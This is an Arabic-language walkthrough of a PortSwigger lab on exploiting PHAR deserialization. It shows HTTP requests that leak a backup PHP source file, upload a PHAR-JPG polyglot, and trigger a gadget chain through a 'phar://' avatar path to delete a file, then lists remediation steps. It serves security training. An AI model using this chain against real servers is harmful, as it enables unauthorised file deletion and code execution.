# [Using PHAR deserialization to deploy a custom gadget chain](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-phar-deserialization-to-deploy-a-custom-gadget-chain)

## **`الهدف`**
قم بحذف ملف `morale.txt` الموجود في `Carlos's home directory`.
## **`خطوات الحل`**
نقوم بالدخول إلى حساب `wiener:peter` ونقوم بتحويل أى طلب يحتوى على الـ `Cookie` مثل طلب `/my-account` إلى `Repeater`
```http
GET /my-account?id=wiener HTTP/2
Host: 0af400b4034d838280d2674d0000002a.web-security-academy.net
Cookie: session=HPy3ATr733Gh0zO7kiA9AIzDGgOlkrQA
```

بعد ذلك سنقوم برفع أي صورة باستخدام خاصية رفع الـ `Avatar` داخل اللاب، وعند التوجه إلى `HTTP history` سنلاحظ أن الصورة يتم استدعائها بالمسار التالي:
```http
GET /cgi-bin/avatar.php?avatar=wiener HTTP/2
Host: 0af400b4034d838280d2674d0000002a.web-security-academy.net
Cookie: session=HPy3ATr733Gh0zO7kiA9AIzDGgOlkrQA
```

لذلك سنقوم بتعديله والتوجه إلى `/cgi-bin`
```http
GET /cgi-bin HTTP/2
Host: 0af400b4034d838280d2674d0000002a.web-security-academy.net
Cookie: session=HPy3ATr733Gh0zO7kiA9AIzDGgOlkrQA
```

وسنجد في الاستجابة ملف `CustomTemplate.php`
```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 786

<html>
    <head>
        <title>Index of /cgi-bin</title>
        <style>
            table { margin: 1em; }
            td { padding: 0.2em; }
        </style>
    </head>
    <body>
        <h1>Index of /cgi-bin</h1>
        <table>
            <tr><th>Name</th><th>Size</th></tr>
            <tr><td><a href='/cgi-bin/CustomTemplate.php'>CustomTemplate.php</a></td><td>1091B</td></tr>
            <tr><td><a href='/cgi-bin/CustomTemplate.php~'>CustomTemplate.php~</a></td><td>0B</td></tr>
            <tr><td><a href='/cgi-bin/Blog.php'>Blog.php</a></td><td>628B</td></tr>
            <tr><td><a href='/cgi-bin/Blog.php~'>Blog.php~</a></td><td>0B</td></tr>
            <tr><td><a href='/cgi-bin/avatar.php'>avatar.php</a></td><td>540B</td></tr>
        </table>
    </body>
</html>

```

لذلك سنقوم بالتوجه إلى هذا المسار ولكن بوضع علامة `~` في نهايته
```http
GET /cgi-bin/CustomTemplate.php~ HTTP/2
Host: 0af400b4034d838280d2674d0000002a.web-security-academy.net
Cookie: session=HPy3ATr733Gh0zO7kiA9AIzDGgOlkrQA
```
وسنجد أن الاستجابة تحتوي على الـ `Source Code`
```http
HTTP/2 200 OK
Content-Type: text/plain
X-Frame-Options: SAMEORIGIN
Content-Length: 1091

<?php

class CustomTemplate {
    private $template_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
    }

    private function isTemplateLocked() {
        return file_exists($this->lockFilePath());
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lockFilePath(), "") === false) {
                throw new Exception("Could not write to " . $this->lockFilePath());
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        @unlink($this->lockFilePath());
    }

    private function lockFilePath()
    {
        return 'templates/' . $this->template_file_path . '.lock';
    }
}

?>
```

وبعد فحصه سنكتشف كيفية حل هذا اللاب.

وبعد ذلك سنحتاج إلى إنشاء `PHAR-JPG polyglot` يحتوي على سكريبت `PHP` ينفذ المطلوب.

ويمكن العثور على العديد من السكريبتات أونلاين عن طريق البحث عن `phar jpg polyglot` ولكن للتسهيل سنستعمل الصورة الخاصة المُعدة من الـ `PortSwigger` من **[Github](https://github.com/PortSwigger/serialization-examples/blob/master/php/phar-jpg-polyglot.jpg)**

بعد ذلك سنقوم برفعها باستخدام خاصية رفع الـ `Avatar` داخل اللاب، ثم سنتوجه إلى `HTTP history` ونقوم بتحويل طلب استدعاء الصورة إلى `Repeater`:
```http
GET /cgi-bin/avatar.php?avatar=wiener HTTP/2
Host: 0af400b4034d838280d2674d0000002a.web-security-academy.net
Cookie: session=HPy3ATr733Gh0zO7kiA9AIzDGgOlkrQA
```

ثم سنقوم بتعديل المسار لنستعمل `phar://` ليصبح كالتالي لننتهي من حل اللاب
```http
GET /cgi-bin/avatar.php?avatar=phar://wiener HTTP/2
Host: 0af400b4034d838280d2674d0000002a.web-security-academy.net
Http/2: 
Cookie: session=HPy3ATr733Gh0zO7kiA9AIzDGgOlkrQA
```
## **`ترقيع الثغرة`**
يجب التأكد من أن اسم الـ `Avatar` يحتوي فقط على حروف وأرقام عند استدعاءه، ولا يحتوي على أي رموز خاصة أو` Stream Wrappers` مثل `://`.

ويجب تمرير الصورة المرفوعة على مكتبة لمعالجة الصور لإنشاء نسخة جديدة من الصورة وحذف الملف الأصلي المرفوع.

وإذا كان التطبيق لا يحتاج نهائياً لاستخدام ملفات `phar`، فيجب تعطيل هذا الـ `Wrapper` بالكامل من ملف `php.ini` أو برمجياً.

ويجب تحديث إصدار `PHP` إلى إصدار `8` على الأقل لأنه بداية من هذا الإصدار تم إيقاف عملية الـ `Deserialization` التلقائية لملفات `PHAR` عند استخدام دوال التعامل مع الملفات العادية مثل `file_exists()` أو `stat()`.

ويجب ألا يعمل تطبيق الويب بصلاحيات مستخدم `Root` ويعمل بصلاحيات مستخدم محدود مثل `www-data` بحيث لا يملك صلاحية التعديل أو الحذف إلا في مجلدات محددة خاصة بالتطبيق مثل `/var/www/html/uploads`.

ويجب ألا يتم حفظ أي ملفات `Backup` أو `Source Code` أو ملفات تحكم بالإصدارت `Version Control` (مثل `.git`) في المجلدات التي يتم تقديمها للزوار، حيث يجب نقل هذه الملفات إلى مسارات آمنة خارج الـ `Web Root`، أو إزالتها تماماً من سيرفر الإنتاج، ويٌفضل إضافة قاعدة `Rule` في إعدادات سيرفر الويب تمنع بشكل قاطع تقديم أي ملفات تنتهي بهذه الامتدادات، حتى لو نسي المطور مسحها.

ويجب تعطيل خاصية استعراض المجلدات `Directory Listing`.
